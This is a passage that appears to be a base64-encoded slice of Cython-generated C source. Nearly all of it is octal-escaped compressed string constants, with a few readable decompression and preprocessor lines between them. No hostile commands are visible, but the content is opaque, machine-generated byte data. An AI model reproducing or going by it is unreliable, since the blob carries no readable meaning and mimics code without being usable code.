MDI1XFwzNjFcXDI3NElcXDIzMFxcMzUyXFwzMzBKQ1xcMzc1NFxcMjIwUFxcMjM0S1xcMjEzb25cXDAyNFY3d1xcMDEzLVxcMzQ0XFwyNzR3XFwzMjdcXDM2NFxcMzQyXFwzMzRcXDAyN1xcMjY3XFwzNjZfXFwwMDZcXDIxMD48XFwyMDNcXDIyMVxcMjY3XFwyNTFcXDMzM1xcMDMxXFwyNDQ4XFwyMjFcXDI3NFxcMzA3XFwzMzFcXDI2NFxcMDA3LzdcXDMwMlxcMjMzXFwyNTRIU1xcMjA1ZVxcMjExc1xcMDM2L1c5aVxcMzE0XFwzNDFcXDAyM1xcMzQybGp7XFwzMjNcXDMxMVxcMzE2VT5cXDM0Mi9cXDI2MltcXDMzMThcXDMyMFxcMDMyc1xcMzAxXFwzMDI1XFwwMzZcXDIyNlxcMjEwXFwzNDNcXDM1MlNcXDIzMVwnWlxcMzUwXFwzMTIvOlxcMDAwXFwyMzVCd15cXDAyNFxcMDM0KkpcXDIwNlxcMzQ1SFxcMjE1UVxcMjc0XFwwMjNTXFwwMzFROEUgXFwzMTBcXDAzMVxcMjMwOllcXDIxN1xcMjQyXFwyNDRcXDMwNzhcXDMwN1xcMDI1eFxcMzMwKVxcMzU1XFwwMzFcXDI3MVxcMjEwUVxcMzI2XFwyNzNcXDAwMmpcXDMzMEtcXDI0MVxcMjAxXCcxXFwyMTBcXDIwMExcXDI2N1xcMzcxXFwwMDZcXDM1MXlBXFwzMjF1XFwzMDcmXFwyNjVcXDM2NlxcMzY0XFwyMDclWFxcMjcwXFwyMDFcXDIwMVxcMjU2ZVxcMjAzMCpcXDMwMWNcXDAyMVxcMjQ0XFwyNTNzTFwnVVxcMjAxXFwwMDJcXHJcXDM1M1xcMzAzYDhcXDIwMGJgXFwyMTV3WVxcclxcMjA3XFwzMTZcXDI0NVxcMzIzSUUjblxcMzU1XFwzNzJcXDM0N1hSXFwyMTJcXDM2N1xcMzIxSFxcMzMyXFwyNTdOXFwzNDYtNlxcMjExSVFcXDI1MnpcXDIzMVxcMzIwXFwzNTNQXFwyNjJcXDIyMEdcJ1xcMzA1XFwwMDEpXFwyNjJcXDI1MVxcMDMyXFxyeVxcMzUwIEAsXFwwMzJqIFxcMjI0WVxcMzYyXFwwMDVcXDAwMlxcMjc0XFwwMzZFUVxcMzAyJVxcMjc2QlxcMzYxXFwwMDVGXFwwMjVcXDIwM1xcMDEzVFxcMDI3XFwzMzU5XFwyNDBUXFwzNDYwXFwyNjdcXDM0MDpcXDI2M1xcMzE3d1xcMjQwV3JcXDM2MV1cXDIyN2pcXDM3MFxcMjM3XFwyMjVcXDM2MSBcXDIxMVxcMDA0XFwwMDNcXDI3MC5oOXVcXDIzMFxcclxcclxcMzQxXFwyNzJVXFwyMTJiXFx0SFxcMzEzNFxcMDIyXFwwMzJcXDAwNlNVXFwyMDUrKGdcXDM2NVxcMzAxXFwwMDVcXDAwMVxcMjUxXFwyMDI8SFxcMjQxUFxcMzY0KlxcMjEyMFhaXFwzNjNcXDM1MVxcMzY0MFxcdFxcMjA2XFwyNzJpflxcMzA1XFwwMTRcXDMzMlxcMjM0XFwwMTBcXDI0N1xcMjIyXFwyNzQ3XFwyNDJCXFwzNDEwXFwzNTRMXFwyNTRcXDIzMzRcXHQxXFwzMTJcXDAyN21FXFwwMjVcXDIwNjJcXDI2N1xcMDI2XFwzMzN7XFwzNTZbOlxcMjI3XFwzMjdcXDIzMVxcMjIzUWtlXVxcMDE0XFwzMDVcXDI0NlxcMjQzK1xcMDIwQ1xcMDMxXFwzNDNcXDIxNUBcXDMyNVxcMzI0XFxcXElcXDIzMFxcMzE0SFxcMjUwXFwyMzFcXDAwNCxcXDMyMVxcMjUyNGBcXDMxM1xcMzYxXFwyNTRcXDI1MTlcXDIzMFxcMzQzXFwyMTVcXDAwMi9cXCIiIlxcMDI1QFxcMjI2TVxcMjYyXFwzNTZcXDAzNCVcXDMyNlxcMjYzXFwzNDZcXDMxNmFcXDIxM1xcMjIzXFwwMDBcXDI1M1xcMzM1ZFkyXFwwMDZcXDIxMFxcMjA2XFwyNDNqamkuQFxcMjY1XFwwMjJcXDIxM3hcXDAwMCh0XFwzMTBcXDIwMFxcMzUxQ1xcMzAxIVxcMTc3XFwyNDVcXDI0NVxcMjEwXFwzNDNcXDI3MVxcMzA1TlxcMjEzXFwzMDVCXFwzMDVcXDIzNVxcMjEwT1xcMDM1XFxuXFwwMzJcXDI0NlRcXDMxM1xcMDI3UjY0RVxcMzMwb19UXFwyMTNcXDM2MVxcMzQzKFxcMjE3Q1xcMDM2XFwzMzFcXDI0MC9cXDAxM1xcMzQzfntcXDI2NVxcMzI0XFwwMzFcXDMyMVxcMzIzXFwyNTVcXDMxMVxcMDAwXFwyMTVnXFwyMjRaIFxcMzEwXFwyMzBcXDMyN3JcXDM1MlxcMzIyJFxcMzMyXFwyNDRcXDAzNVxcMDIwXFwyMTZcXDIwMFxcMDIyXFwyNTBcXDI3MlxcMzE1XFwyMDZVKFxcMzQyOlxcMzE0XFwzMzA8clxcMzIxXFwwMDRcXDM2MmhgYVxcMzAxXFwzNTNcXDIxMCFcXDIxN0tGXFwyNzFfXFwwMjBiXFwyMTRGRFxcMDA2XFwwMjRcXDAzMFxcMjc0XFwzNjVcXHRcXDAxMFxcMjI2ZVxcclxcMjA2XFwzMjVcXDAzN1Y/XFxyM1xcMzA2XFwyNDJcXDAxMFxcMzA1XFwyMDAoXFwzNzJFXFwzMzJcXDAzMVxcMDAyXFwyMzJcXDMwMlxcMDIyXFwwMDNcXDAwNi5xODFcXDI1MFxcMzAyXFwyNTVcXDI3M1xcMDM0TFxcMzY0R2RcXDM0MFxcMzE1XFwwMjFXXFwyNjFcXDAxMFxcMDE0XFwzMzFcXDIzM1xccn5cXDIyNlxcMjU0XFwzNzFCXFwzMjBHXFwyNzZcXDM0NVxcMjE1XFwzMTRcXDI0NHlcXDAxM1xcMjMzXFwzMTJ4Z3tpXFwwMzRcXDIxMUd1d1xcMzE2XFwzNzZcXDMyMUJcXDI2NVxcMDMzXFwyMDIjXFwzMTNcXDIyNkRcXDMxNVxcMjQySFxcMjA0XFwwMjZcXDM2MiZcXDIyN1xcMzA1SVxcMjU1XFwzMjdEXFwzMDMzXFwyNzdcXDAzM1xcMjQ0aWxcXDM1NUQua1xcMDA2XFwzMjZcXDMzNlxcMzI0Q0JcXDMzMlxcMzQyXFwyMTdMXFwiXFwzMjVcXDM1MlxcMzI3b35cXDI0NVxcMjAyXFwzMDNcXDAzMjp9XFwwMDJaXFwzNDBcXDAyNGo7WVxcMzI2XFwyMDYmd1xcMjcze1xcMjMzXFwzMTVcXDI1M3hcXDMzM3w7XFwzNjdcXDMzM1pcXDM2NFxcMzQwXFwzMDNKXFwzMzFcXDAwNWI8LlxcMDM2XFwzNzBcXDMyMlxcMjAxXFwyMTVcXDMyMFxcMDIzXFwzMzdcXDAwMVxcbmBcXDIzN1xcMjQyIVxcMjA1XFwyMDY8W1xcdExcXDM1NVxcMzA2XFwyMjIyM1xcMjEwXFwwMzFcXDAyMVxcMjM2XFwzMzJcXDM1MFxcMjQ1XFwyNTNcXCJcXDMyMlxcMjYwXFwyMDA1XFwyNjJcXDIxNFxcMjI3XFwwMTZcXDIyNlxcMDEzIXRcXDMxMSh0XFwyNTBcXDIwMERcXDM1MlxcMDA0WENbLlxcMjQxXFwwMDVWXFwyNzBdXFwyMTRcXDAwNlxcMjA1XFwzMTZcXDM1MFxcMzI2elxcMDAzXFwwMjJcXDI0M11bXFwwMzZZXFxySVxcMzE1XFwzMTZcXDMxMFxcMjc3XFwxNzcxXFwyNjRcXDMwNk1cXDI3MkxcXDMxMFxcMjU1QlxcMDEwVVxcMzQwXFwwMzNXTyBcXDI1NlxcMzYybDNcXDM1NCVcXDIyNVxcMDA2XFwyMzV1XFwyMzNlXFwyMzVcXDMwNlxcMDAzXFwyNDBcXDAwMlxcMzE0XFwzMjdcXDMyMlxcMzYzXFwzNDZcXDI3N1xcMjAxXFwyNTdgXFwyNTFcXDAzM3pEdFxcMDA2OVxcMDEwSVxcMjc2XFwwMjRcXDAzMVxcMzE0QFxcMDMzXFwyMjRcXDIxM0JcXDMwMlxcMDAxXFwyMzRcXDI2NDJFSHEmK1xcMjA1XFwzMjdsXFwzMTNcXDI2Mm5cXDIyMFxcMjQ3cVxcMjUwXFwzMTRYJFl3XFwzMzJcXDAyNlxcMzIxXlRcXDMzMVhBXFwyNTVcXDIwNFxcMjIzM1xcMDI0MVxcMjIzXFwwMDZZXFwyMjBcJ1xcMDI1XFwwMzFcXDI3MWJcXDM3MlxcMjI1XFwyNzVcXDM1NVxcMzE3QVxcMjQwXFwyMjZcXDI3MjVcXDI2M1xcMjYyXFwyNzFcXDI0MlxcMjU0XFwzMjNuXFwwMDVcXDIwNiBcXDMwMlxcMzAwdFxcMjcwXFx0WURPXFwyMTFcXDMwNVxcMjA2dlxcMjYwXFwwMzFcXDI1NlxcMDIwXFwzMTRcXDI2MFxcMDEwXFwzMTFcXDM1N1xcMDA2RlxcMjIwXFwzMDRcXDAwMVxcMzUwXFwzMDdJXFwyNzNcXDIyM1xccnxcXDI3M1xcMjU1XFwzNTdhTFxcMjQ2MVxcMjQxXFwzNDBcXDIwMFxcMjc2JFxcMjU0XFwwMjBcXDMwNFBcXDIyNztcXDIyMVxcMjYzXFwyMzcrYXlcXDAwMFxcMDI0XFwyNTBcXDIyMFxcMjQyXFwyMzAyXFwwMDNcXDIyNVxcMDAzOVxcMzA1ezZsXFwzMDBpK1xcMjcyeXpcXDM3NVJcXDI0MyBcXDM2M1xcMjQ2TVxcMzcyXFxubVxcMzQ2XFwwMTRcXDMyNTdcXDMwN0xpXFwyNjNcXDMwNFxcMjMyXFwzNTNcXDMwNFxcMDEwXFwwMTRcXDIyMFxcMjEzOlxcMjc2XFwyNjR3LVxcMjUxXFwwMjBcXDAzNFxcMjEwXFwwMTNcXDIxMnlGXFwwMDJcXDM1M1RcXDI2MVxcMjIyXFwyNjVcXDIyMjZcXDI0MFxcMzIxXFwzNDdcXDIzMFRZXFwzNjRcXDIxMFxcMzU3aVxcMjUxITsvXFx0XFwyNTRcXDIzNVxcMjQ2XFwwMzVcXDAwM0AuXFwwMDRcXDI3NFxcMDE3XFwyNTFcXDAzMyIiXFwzMjJcXDI1NlxcMzc0JWxCRVxcMjQwXFwwMDM5KlxcMjQ1RlxcMDIyO0pcXDAwMUVcXDI3N1xcMjY1OVxcMDI2XFwzMjVcXDAzNFxcMzIxbFxcMzY0XFwyMTBcXDI3MVxcMjM2QVxcMDMxXFwyNTNcXDM2NFxcMjYxXFwyNTRcXDI1MylcXDMyMFVcXDIzMVRcXDI0M1xcMDAwXFwzMjBOXFwiVVxcMzA1fFxcMDE0XFwzNzZNeFxcMzU0XFwyMTVcXDM2N1xcMzQwL0NiXFwyMTMlZ3hcXDMxMFxcdExcXDIzNGFcXDM1N1xcMDA0XFwzMTRcXDI3NFxcMzQyQlxcMjA0dVxcMjQzSFh0OlBcXDIwM15cXDIzMlxcMzY3XFwzNTZcXDAxNFxcMDE2XFwzMDBcXDI2MVxcMzEyXFwzMjVcXDMwN1xcMDA1XFwzNjFdXFwwMDM9XFwyNDNcXDIxMEpcXDMxM1xcMjcxOlxcMDMzXFwwMzFFXFwwMzRcXDI3MlpcXDI2N1xcMDAxXFwzMzVcXDAwNVxcMjY0XFwzNjJcXDMwNlxcbl1dfFxcMzAxXFxcXDxcXDAzMlxcMDI3XFwwMjJcXDI1NlxcMjIwXFwzMDA0XFwzNzd0V1V4XFwyMDBcXDMyMzFGXFwzMTJcXDIzNlxcMjI2YFxcMjI3XFwzNzNcXDIzN2RcXDMyMFxcMjU2XFwyNzNcXDAzMmNcXDAzMFxcMzUwXFxuXFwyMjQ2XFwzNjJcXDI0NFBvY1xcMDEzXFx0XFwyMzJcXDM3NlxcMjE2XFxyNjJcXDAxNFxcMjA0XFwyMzRcXDIwMFxcMzMwXFwzMTIwXFwyNTVBZlxcMjE3KF9cXDI0NCtkV1xcMzMxXFwyMjJcXDM0NlxcMjMzXFwyMzRcXDM2NFxcMTc3XFwwMDNcXDMxNFxcMjEwbTdcXDMyN2o7UVxcMzQ3P1xcMzM3XFwzMzdcJ1xcMjAzXFwzMDAgXFwyMzFkXFwwMDFcXDM0MjBcXDMzM1xcMzQwTFxcMTc3XFwyMDFcXDIzMEhcXDAwNmRQYVxcMjY3XFwzMDJqXFwyMDBcXDAyM1xcMjIzdkRcXDIyM1xcMjc0XFwwMDVcXDMxN1xcMjAwQ1xcMDEwXFwyNjAuO05cXDIyNlxcMjM2XFwyNjFcXDIyMnVoXFwwMzJcXDIzNlxcMjI1XFwzMDZcXDAzMFxcMzMyXFwzMDN7XFwwMDIlIVwnXFwyMTNcXCJxXFwwMzVcXDIwNlxcMjczXFwyNzdUXFwyMDVcXDIwM1xcMjU3XFwwMjJcXDMwMFxcMjAwdlxcMzIzXFwzMzFcJ1xcMjI3XFwwMTBcXDIxMVxcMzc1UTFhXFwyNjNcXDMwMUlcXDIwN1YwXFwzNDRcXDI3M1xcMDI1XFwyNzNYXFwzMTExXFwwMjBcXDM0MVZkV1wnXFwyNjFcXDMwNEg6XFwyNTA/KzVcXDIyNVxcMzUza1xcMzczXFwyMTJcXDMzMlxcMzA2P29IcnpcXDMzMFxcMjYzXFwwMDJcXDMwMDBcXDIyNVxcMjA0aVxcMzMwPW5cXDMzMXk9XFwyMTdcXDI1NFxcMjIxXFwzMzE0XFwwMjFcXDIxMyhfXFwyMzNcXDMyMFxcMjE1XFwyMjdcXDAxMHlcXDAyMkFcXDIwMVxcMjQzXFwwMzdcXDIyNlxcMzAxfiRDXlxcMzM2XFwzMDVcXDMzNkVcXDAyNVxcMzE3XFwyNTFcXDM3MFxcMDA3XFwzMjFcXG5RXFwyNTBcXDI3NFxcMjQ3XFwzMTBcXDAyM3tcXDI1NVxcMjYzXFwzMzJcXDMzM1xcMzcyal4wXFwyMDNaXFwyMjFcXDI2NFxcMjY0aVxcMjE1XFwyNTN3XFwyNzRcXG5cXDI3MmFXTSZmXFwzMjBcXDMzMFxcMzMwXFwzNjNcXDM1NF5cXDAxMFxcMzUwXFwyMDF5KTRcXDE3N1xcMjA2XFwzNTdcXDAzNVxcMzM2XFwwMzVcXDM3M1xcMjMzV0VcXDMxNVZcXDIwMDRcXHJcXDI0NnpcXDAyNlxcMzIyXFwzMzJcXDM3M1xcMjAyXFwwMDVcXDMxNlxcMzExXFxyUlxcMjY2L3xcXDM1MVxcdFAxczhcXDI2NlxcMTc3XFwzMjBcXDI3NWlCXFwzMzFcXDIwNVxcMDMwXFwyNzNxXFwzMjdcXDMyNFxcMjUzXFwwMTYjXFwzMjdJa1xcMzM0XFwyNjVcXDI2MFxcMjY0XFwyNDFcXDIzN1xcMzU3XFwyMTZcXDI3NVxcMzc3SFxcMjc3XFwwMDMxXFwzMzRcXDAyNVxcMjU1fCpnXFwzMDE6XFwzMDdcXDM2NVxcMDMyXFwyNzFcXDI1M1hJIUhLeVVcXDAxNlxcMzczXFwzMDFcXDI1M1xcMzcya1xcMjU0flxcMzQ2XFwyMjY8XFwzMzZ6XFwyNDZcXDIxMlxcMjM0XFwzNzRVdVxcMjA1XFwyMDZcXDMyM1xcMjAyZFxcMjI0XFwzNjJcXDM3Mmt9XFwzNDJcXDI3MFxcMjU3V1xcMjczYVxcMDEzXFwyNTdcXDMxM1dcXDI3M1xcMzA0OFxcMzAyXFwyNTRcXDIzNVxcMzIzUixaXFwzNzNLWlxcMzE3XFwzMzFkXFwwMTdcXDIxN1xcMjMxXFwwMDNcXDM1N1xcMjYzXFwyNTdMXFwzMTRrXFwzMjYjNFxcMzUzVVxcMjUxXFwzMzNcXDM1NXdSfVxcMzE2XFwwMjUrXFwwMjdcXDIzN1RcXDM0M1xcMjI3XFwyMTR8XFwyNzVcXDI3NVxcMzcyIzRwXFwwMjUkIFxcMzYyXFwyNTA/PVxcMzc0WzdcXDMzME0wXFwwMDBcXDMzMytcXDMyMVxcMjQ0XFwzMDRcJ1xcMjY3XFwyMDJcXDMzNVxcMzY2XFwwMDBcXDIwNCpcXDI2NG1cXDM3NlxcMzYzXFwyMjVEXFwzMjNcXDIyMylcXDIxNFxcMjU0XFwwMjJcXDIwMFxcbmdcXDMxMlxcMjExXFwzMDJcXDAwMFxcMDIwXFwyMDNcXDIyN1xcMjYxXFwzNzVlR1xcMzQxXFwwMzdcXDI2M1xcMzE1XFwzNTVcXDM0MFxcMjE1XFwyNzFcXDAyN3NxXFwzMjFcXDAyNlxcMjI1XFwzMjFcXDI0NVxcMjE1XFwzNjdcXDAzNVxcMzEwXFwzMDN2KVxcMzE3XFwwMzE9fFxcMzM2T1xcMjQ3XFwzMDAiIlxcMzE1XFwyNzdcJ1VcXDM2N1xcMzExXFwyNzQ5S3hcXDI2MFxcbklgX1pcXDIwMDxcXDIwMF1cXDAzNzkyXFwyMzVcXDAzMzxcXDAyNlVcXDIxMVxcMzczN1xcMDMzXFwyMjVcXDI3NFxcMzYyPmVcXDE3N2JcXDM3MFxcMjI0PlxcMjE0VFxcMjExO3dcXDIxNVxcMzU2MFxcMzc2JVxcMzU3XFwwMDVcXDI1NTZcXDM3NlxcMzQ1XFwyNTdcXG5cXDAxM1xcMjYzXFwzMzJbXFwzMjdcXDAyN1dcXDIzNVxcMDAyXFwyMzJcXDIyNlxcMjMxXFwyNDQkXFwyMzVUKFxcMDI0XFwyMTJcJ1xcMDEwXCdcXDI0MU5cXDM1N1xcMDMwXFwzNzNcXDIwM1xcMjIzXFwwMzdcXDI2NFxcMjMxXFwyMDdNWFxcMjU1XFwwMDdvNVxcMjc0QnNrXFwzMDZcXDAzMFxcMDMyXFwyMTUoRlxcMDE3P1xcMDMyXFwzMjdcXDMzMkIyclxcMjI0XFwyMjA9bUhcXDI1M1xcMjM1XFwyMTZcXDM1MEhuXFwzMzdcXDI0MVxcMzMwXFwzMzFcXDAyMlxcMjIzSlxcMDAxRVRcXDM0Nk1cXDI1NVxcclxcMzI2XFwzMDMoXFwyMDNcXDAyNVVcXDI3NzhcXDI0MFxcMjcwXFwyMDFcXDI0MVxcMzEwQVxcMjY0XFwyNDdcXDAxNFxcMzU2IVxcMjQ0XFwwMzVcXDMzMFxcMzQxXFwzMjYuN1xcciMzXFwyMzRcXDMyNFxcMjA1XFwwMjdcXDMyMVxcMzE0XFwzMzUmXFwwMTZcXDMzMFxcclxcMjI3SlxcMDEzXFwzNjNkXFwyNDRcXDMyNVxcMjQ3SFxcMjM0JlxcMDA2THJcXDMzNkFcXDI1N1xcMjUwQVxcMDE0UTswVlxcMDM1XCcmXFwyNjVcXDMxNVxcMjI2cFxcMzY0XFwwMTBcXDI2MSBcXDIxNFxcMzE0YiRcXDIxNFxcMDMxXFxyU1xcMDEzcVxcMzM1KVxcMDI0YTYwblxcMzEyXFwyNDJcXDIwMTJJIFxcMzUzOVxcMDA1MVxcMzcxXFwwMDBcXG5cXDM0M1xcMzMzXFwwMzBcXCJcXDMzNVxcMTc3IFxcMDMxXFwyNTdaJVxcMzc1XFwzMTFcXDMxMVxcMjc1XFwyNjdcXDI0NFxcMDAyWlxcMzE2XFwyNDRcXDIwMVxcMDEzLVxcMzI3XFwyMDVTXFwzMjFnXFx0XFwyMTRcXDMwN1xcMzc0XVxcMzExXFwwMjRcXDM0MUJAUFxcMjI3KVxcMzYwIjtcbiAgICBQeU9iamVjdCAqZGF0YSA9IF9fUHl4X0RlY29tcHJlc3NTdHJpbmcoY3N0cmluZywgNTIzNSwgMik7XG4gICAgaWYgKHVubGlrZWx5KCFkYXRhKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICAgIGNvbnN0IGNoYXIqIGNvbnN0IGJ5dGVzID0gX19QeXhfUHlCeXRlc19Bc1N0cmluZyhkYXRhKTtcbiAgICAjaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgICBpZiAobGlrZWx5KGJ5dGVzKSk7IGVsc2UgeyBQeV9ERUNSRUYoZGF0YSk7IF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikgfVxuICAgICNlbmRpZlxuICAgICNlbGlmIChDWVRIT05fQ09NUFJFU1NfU1RSSU5HUykgIT0gMCBcbmNvbnN0IGNoYXIqIGNvbnN0IGNzdHJpbmcgPSAieFxcMzMyXFwyNjVYW3NcXDMzM2Z6XFwyMTZkXCdcXDM1MyRcXDMxNlhcXDIxMlxcMDI1Wz5cXDI0NFxcMjQxZEtcXDIxMVxcMjc1XFwzNDJcXDAwMSBcXDMwNVxcMjAzXFwyNjVcXDIxMk1JXFwyMjREXFwyMzM6XFwyMjJcXDIyMnxcXDIxMFxcMDI3XFwwMTNcXDAwMiBcXHRcXDAxM1xcMDA0SFxcMDAwXFwyMjREXFwzNTdmXFwyMzJcXDI3NVxcMzUwXFwyMTRcXDI0N1xcMzIzXFwzMTZcXDI2MlxcMzMzTFxcMDA3XFwzNTV0XFwyNDZcXDI3MFxcMzUwTHlcXDMyMVxcMDEzXFwzMzZcXDIyNTNcXDM1NVxcMjA1Ln1cXDIxMUtealxcMzY2XFwwMTc0P1xcMjQxXFwzMTdcXDAxM1xcMjAwXFwyMjJcXDI0NThJXFwyNjdcXDMzNVxcMjQ1XFwyMDBcXDM1N1xcMjE0XFwzNTd7XFwwMTdcXDMxN3tcXDM3MFxcMDI0XFwwMzFcXDIzN1xcMjEyXFwzNDBPbShcXDIxMldcXDIxNFxcMzU3S1xcMzA1YFlcXDIyMUtBQy5cXDI1M1xcMjE1XFwzMzJ4XFwxNzdcXDIyNlxcMjMxelxcMzY2fFxcMjEyeVxcMDM2XFwwMjEjXFwzNjFcXDIwNFxcMzAwXFwyMjZcXDIyMnFcXDIwMVxcMDI3WFxcMjAxSVxcMjEwXFwzNjFcXDM1MVxcMzUxeFxcMjI0XFwwMjFSXFwyMDIkXFwyNjBcXDI2MVxcMDEwXFwwMzNhXFwzMzBSMVxcMzAyR1xcMzMxVFFcXDM0MEtcXDMwNWhcXDIyMSlcXDMwNVxcMjA0SFxcMjYxOFxcMDM1R1xcMjEzKVxcMjA1XFwiYlxcMjExLyVcXDMzMUhcXDIyME1cXDMwNFxcMjIyXFwzMDFYPFxcMDMyXFwwMTNcXDI0NlxcMjQyXFwzNjFcXDM1MVxcMjQwXFwwMjBcXDAyNVxcMjIzQjJcXDMwMjBcXDM1NHRcXDM3NFxcMzA2XFwyNjNIXFwyMjVhXFwwMjJcXDIyMVxcMDEwO1xcMzE1TFwnYlxcMjQxVFxcMjIyXFxyMlxcMjQxSCRcXDMwMlxcMjI0XFwwMjJcXDMxMVgsXFwzMTJcXDAwNFxcMzMxeDxcXDAzMlxcMjE0XFwyMTFcXDMwNVRcXDI2MFxcMDMwZ2NcXDMwMWRcXDI3NChcXDIwMlxcMDAwRlxcMjE0JGNBZlxcMjY3WDNuPGNcXDI1MmxcXDIwNFxcMjE2XFwyMTFcXDI2MFxcMzIxXFx0XFwyMjZcXDIzNWBcXDM0NyNcXDM3NlxcMzEzXFwzNDAlXFwyMjZcXDM3NFxcMzU2NFxcMDIzT0xML0xcXDM2Mi9cXDMxNVxcMzMxXFwzNjRcXDI0MlxcMzA2XFwyMjdcXDI2N1xcMjY2XFwzMTRNZW87XFwzMDUmXFwyNjV8ai1cXDI2MVxcMDMwXFwyMjdcXDI0NGxMXFwyMzRfY3VGLk9EXFwzMjNMXFwyMDJhXFwyNDMsXFwwMzNcXDIxM0dcXDIyMlxcMzExXFwzNDRcXDI0NFxcMjQwaVxcMjczXFwyNjJkLFxcMzEwXFwwMDZfVCRxXFwyNjZcXDMwNCtcXDIwNjQpSntcXDI2MiBcXDMxMWpJXFwyMzNcXDIzNVxcMjMwXFwyMzZcXDM2M09cXDM3M1xcMjYxXFxuJFxcMjU2XFwzNDY8OlxcMTc3aH5cXHRaXFwzMzFcXDIyMVxcMjEyeVxcMzUwJVxcMjUzXFwyMzZaXFwyMTIjXFwzMDBcXDMwMU9cXDIzNFxcMzAwXFwyMzZmXFwyMzNcXDM2MTZ9XFwzMzNcXDIyMVxcMjU0XFwzNzNCJFxcMzQ1XFwyNTIhaFxcMjcyXFwyNjRcJ1xcMzUxXFwyMDZcXDI1NFxcMjUxXFwyNjNcXHJVXFwyMjRKXFwyNjIqXFwyMTFcXDIyMyVFXFwzMzNfXFwzNDVcXDI1M1xcMzIyXFwzNTQpXFwyMzImXFwyNzVcXDMxNVBcXDI2MlxcMzIxcDxcXDAyNGFjXFwzNDFcXDAwNFxcMzEyaVxcMjI0TFxcMjEwYVxcMzQzXFwzNDEkelxcdFxcMjI0XFwwMTRcXDIzM1xcMDE0XFwyNDdCXFwyMjFcXDAzM1xcMzE3XFwyNDJcXDMxMVxcMjMxXFwzNTFcXDAzMVxcMjA2SVZcXDM3M1xcMzE1XFwzMjRxXFwyMjNcXDIxNVxcMDM0N1NcXDMyMWpcXDI2NFxcMjUwXFwwMjdcXDM2NlxcMzY2Z2djXFwzMjNcXDAyMUFcXDIxMFwnXFwzNDNMMFxcMDIxXFwyMTFcXDMwNlxcMjAzXFwyNjFoXFwwMjFcXDMxMlxcMjE3XFwyNjBSXFwyNjBUXFwyMTRcXDI2MUk2XFwyMjFKXFx0XFwzNjFcXDMxMHQ8XFwwMDFcXDIyMEZjXFwzMjFcXDM1MDRcXDAzM2NcXDAyM1xcMjExXFwwMDRcXDIyM2BcXDM0M1xcMjUxWDJcXDAzMVxcMjE1XFwzMDZcXDIwMVxcMjQxXFwwMzNcXDMxN1JcXDAxNFxcMjY2TlxcMjYxVERcXDI1MVxcMjEwUTFNRVxcMjM0XFwyMTJENVxcMzI1XFwyMTRcXDI1Nk5cXDM1N1xcMzQ2XFwzNTIvZV5cXDMzMUhcJ15cXDI0NlxcMzQyXFwzNTFcXDAyNVxcMjcxXFwyMzF+XFwyMjRbXFwyMzFcXDMzM1xcMjUxXFwzMjVcXDI2N19cXDI0NFxcMDA1QVxcMjUyXFwyMzFcXDMwMVxcMjE0KmhcXDI0MlxcMjU0XFwyMjZcXDM3NW5cXDIxNldcXDMxM1xcclxcMjc2LFxcMzE1XFwyNDVcXDAyN1xcMDAyXFwzNTZcXDM1N15cXDIwMFxcMjMyK1xcMzUxbFxcMjE2XFwyMzJPXFwzMjZcXDMyM1xcMzcxfGAhU1xcMzEwXFwzMTRcXDAyNzJcXDAxM1xcMjAxXFwzMDJcXDMzMlouXFwyMjAvXFwyNTRcXDI1NVxcMzE3aWZcXDI0MFxcMjQwXFwzNTVKXFwzNTJcXDI3NVxcMzAwXFwyNzRcXDI0NlxcMjMyXFwyMjJqXFwwMDZcXDAxM1xcMzE1XFwyMzJcXDM2NFxcMzAxXFwwMzdcXDI3NlxcMzc1XFwzNTUiIlxcMjM3XFwzNDNcXDM3MVxcMzQwXFwyNzNcXDE3N1xcMzcxXFwzNzVcXDE3N1xcMDA2XFwwMjZcXDI0ND1cXDMyMFxcMzY0YGl5LV9cXDM0MDZcXDAyN1xcMDM3XFwxNzdcXDIwMFxcMzQxXFwyNzdcXDM3N1xcMjY3QFxcMjQ2XFwzMTJcXDMxM0pcXDI0MFxcMzc3XFwyNzNcXDAyN1xcMjQwXFwzMjFcXDI3N1xcMDE2LGpcXG5cXDAyNFxcMDE2XFwwMjRcXDIzNFxcMjE0flxcMzczW1xcMTc3XFwwMjRcXDM1NFxcMzczXFwyNDNcXDMxM1xcMzMxQlxcMzM2b3JcXDMzNFxcMjYyZlxcMjMwXFwzMDFcXDI0NVxcMzY0ej5cXDI1M1xcMDMyJl9cXDMyNlxcMzcxalxcMjAwXFwyMTFEQlxcMzY0XFwzMDdcXDAwMFxcMDE2bCpcXDIyMFZFXVxcMjIzXFwzMDVcXDMwMFxcMDI3bCpcXDMxNERmXFwwMDIxNlxcIlxcMzI2XFwzNDRcXDAzMSxLRlxcMDE2WFxcMjU0XFwyMzBcXHRcXDAzMHxcXDMyNWhcXDI1MFxcMzQ1XFwyMzFAfiVcXDI3MFxcMzAyRlxcMjQ2XFwwMjdnXFwwMDIwalxcMzA1XFwyMjRmXFwwMDJcXDMyMkFTXFwzMjVcXDIxNEQqXFwwMjJDW1xcMzQ1XFwyMjZcXDM0NlxcMzYwYVxcMjM0XFwyMTElXFwyMjJcXDM2MXhcXDM1NFxcMzE2XFwzMTFcXDIzMVFcXDIwNnFcXDMxN1xcMjE0XFwyNjIhXFwzMDBcXDM1NFxcMzQ0TFxcMzQyXFwzNTNcXDI1N1xcMDAyXFwwMTc1QnNcXDM0MFxcMjExXFwzMDRcXDM1My5cXDMzMVxcMjcxXFwyNDVMWClDXFwzNjJcXDM3N1xcMzY0XFwyMTdcXDM3N1xcMzM1XFwzNzVdYEUyXFwzNzFAXFwzMzZcXDM0NFxcMzE1XFwyMDZcXDM0MU5cXDI1N1xcMjA2XFwzMjNcXDI1M1xcMjMyXFwyMTJcXDM1MVxcMTc3blxcMDA3XFwzMjY3XFwzMjdcXDAyNlxcMjYzXFwyNzFMYG07XFwyNjNcXDI3MVxcMjM1XFwzMTVcXDM1NFxcMDA0MFxcMzcwZ1xcMzI0XFwzMzBcXDMzN1xcMzc1a1xcMjAwXFwzNTQtcFo1XFwzNzdcXDM2MF9EXFwzNDY6RG1cXDIzNFxcMjM2XFwzNzBcXDM2NlxcMzY3XFwyMDF1XVxcMzM2XFwzNDNNXFwzNTFcXDMxNVxcMzIxXFwyNzdcXDM3MVtcXDIxNGolWVxcMjIxXFwwMDI5WVxcMzM1XFwyNDVcXDMyMVxcMjEyaVxcMzI2XFwyMTR7XFwzNDFcXDM2MFxcMzc2XFwzNzZ+SFxcMzU2Sy0